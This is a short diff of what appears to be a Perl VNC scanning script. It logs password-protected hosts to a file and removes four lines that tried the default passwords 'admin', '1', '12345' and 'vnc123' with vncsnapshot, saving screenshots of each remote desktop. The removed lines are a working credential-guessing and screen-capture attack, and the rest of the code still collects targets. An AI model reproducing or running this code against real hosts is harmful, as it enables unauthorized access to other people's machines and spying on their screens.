@@ -47,8 +47,4 @@ if (defined($security)) {
 } else {
 qx!echo $hostname:$port >> qvncDE!;
 	warn "[$hostname:$port] Password required - ignoring.\n";
-	system("echo 'admin' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . "ADMIN.jpg >/dev/null 2>&1");
-	system("echo '1' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . "1.jpg >/dev/null 2>&1");
-	system("echo '12345' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . "12345.jpg >/dev/null 2>&1");
-	system("echo 'vnc123' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . "vnc123.jpg >/dev/null 2>&1");
 }
